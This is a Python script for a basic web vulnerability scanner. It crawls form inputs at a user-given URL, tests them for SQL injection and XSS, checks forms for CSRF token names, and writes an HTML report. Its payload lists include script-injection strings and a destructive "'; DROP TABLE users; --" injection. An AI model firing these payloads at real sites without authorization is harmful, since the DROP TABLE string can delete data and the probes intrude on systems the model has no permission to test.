# Import necessary libraries
import requests  # For sending HTTP requests to the web application
from bs4 import BeautifulSoup  # For parsing the HTML of web pages


# Step 1: Extract input fields from the web page
def extract_inputs(url):
    """
    This function takes a URL as input, fetches the page, and extracts all form input fields.
    """
    try:
        response = requests.get(url)  # Send a GET request to fetch the web page
        soup = BeautifulSoup(response.text, 'html.parser')  # Parse the HTML using BeautifulSoup
        forms = soup.find_all('form')  # Find all form tags in the web page

        input_details = []  # List to store input field details
        for form in forms:
            inputs = form.find_all('input')  # Find all input fields in the form
            for inp in inputs:
                # Add details of each input field to the list
                input_details.append({
                    "form_action": form.get('action'),  # The form's action attribute
                    "form_method": form.get('method', 'get'),  # The form's method (default is GET)
                    "input_name": inp.get('name'),  # The name of the input field
                    "input_type": inp.get('type'),  # The type of the input field (e.g., text, password)
                })
        return input_details
    except Exception as e:
        print(f"Error extracting inputs: {e}")
        return []

# Step 2: Test for SQL Injection vulnerabilities

def test_sql_injection(url, input_details):
    print("[*] Testing for SQL Injection...")
    payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1#", "' AND 1=1--"]
    vulnerable = []

    for input_detail in input_details:
        for payload in payloads:
            data = {input_detail['input_name']: payload}
            print(f"[*] Testing input: {input_detail} with payload: {payload}")  # Debug
            try:
                if input_detail['form_method'].lower() == 'post':
                    response = requests.post(url, data=data)
                else:
                    response = requests.get(url, params=data)

                # Print response text to verify server behavior
                print(f"Response for payload '{payload}': {response.text[:200]}")  # Debug

                # Check for SQL errors
                if "SQL syntax" in response.text or "database error" in response.text:
                    print(f"[+] Vulnerability found! Input: {input_detail}, Payload: {payload}")
                    vulnerable.append({"input": input_detail, "payload": payload})
            except Exception as e:
                print(f"[-] Error during SQL Injection testing: {e}")
    return vulnerable

# Step 3: Test for Cross-Site Scripting (XSS) vulnerabilities
def test_xss(url, input_details):
    print("[*] Testing for Cross-Site Scripting (XSS)...")
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "'\"><script>alert(1)</script>"]
    vulnerable = []

    for input_detail in input_details:
        for payload in payloads:
            data = {input_detail['input_name']: payload}
            print(f"[*] Testing input: {input_detail} with payload: {payload}")  # Debug
            try:
                if input_detail['form_method'].lower() == 'post':
                    response = requests.post(url, data=data)
                else:
                    response = requests.get(url, params=data)

                # Print response text to verify reflection
                print(f"Response for payload '{payload}': {response.text[:200]}")  # Debug

                if payload in response.text:
                    print(f"[+] Vulnerability found! Input: {input_detail}, Payload: {payload}")
                    vulnerable.append({"input": input_detail, "payload": payload})
            except Exception as e:
                print(f"[-] Error during XSS testing: {e}")
    return vulnerable

# Step 4: Test for CSRF vulnerabilities
def test_csrf(input_details):
    print("[*] Testing for Cross-Site Request Forgery (CSRF)...")
    csrf_vulnerable = []

    for input_detail in input_details:
        # Check if the input field name contains "csrf" (common naming convention)
        if 'csrf' not in input_detail['input_name'].lower():
            csrf_vulnerable.append({"input": input_detail})
    return csrf_vulnerable

# Step 5: Generate a report

def generate_report(vulnerabilities):
    """
    Generates an HTML report summarizing the vulnerabilities found.
    """
    try:
        print("[*] Generating vulnerability report...")
        html_content = "<html><head><title>Vulnerability Report</title></head><body>" 
        html_content += "<h1>Web Application Vulnerability Report</h1>"

        for vuln_type, issues in vulnerabilities.items():
            html_content += f"<h2>{vuln_type}</h2><ul>"
            for issue in issues:
                # Handle CSRF differently
                if vuln_type == "CSRF":
                    html_content += f"<li>Input: {issue['input']} - CSRF Protection Missing</li>"
                else:
                    html_content += f"<li>Input: {issue['input']} - Payload: {issue.get('payload', 'N/A')}</li>"
            html_content += "</ul>"

        html_content += "</body></html>"

        with open("report.html", "w") as report_file:
            report_file.write(html_content)
        print("[+] Report successfully written to 'report.html'.")
    except Exception as e:
        print(f"[-] Error while generating the report: {e}")

# Main Function
if __name__ == "__main__":
    print("Welcome to the Web Application Vulnerability Scanner!")
    target_url = input("Enter the target URL (): ")
    print(f"[*] Scanning target: {target_url}")

    # Step 1: Extract input fields
    inputs = extract_inputs(target_url)
    print("Extracted inputs:", inputs)  # Debug: Print extracted inputs
    if not inputs:
        print("[-] No input fields found. Exiting.")
        exit()

    # Step 2: Test for vulnerabilities
    print("[*] Testing for SQL Injection...")
    sql_vulnerabilities = test_sql_injection(target_url, inputs)
    print("SQL Injection results:", sql_vulnerabilities)  # Debug: Print SQL results

    print("[*] Testing for Cross-Site Scripting (XSS)...")
    xss_vulnerabilities = test_xss(target_url, inputs)
    print("XSS results:", xss_vulnerabilities)  # Debug: Print XSS results

    print("[*] Testing for CSRF...")
    csrf_vulnerabilities = test_csrf(inputs)
    print("CSRF results:", csrf_vulnerabilities)  # Debug: Print CSRF results

    # Step 3: Generate report
    vulnerabilities = {
        "SQL Injection": sql_vulnerabilities,
        "Cross-Site Scripting (XSS)": xss_vulnerabilities,
        "CSRF": csrf_vulnerabilities,
    }
    print("[*] Generating report with the following data:", vulnerabilities)  # Debug: Print vulnerabilities

    generate_report(vulnerabilities)
    print("[+] Scanning complete. Check 'report.html' to view the results.")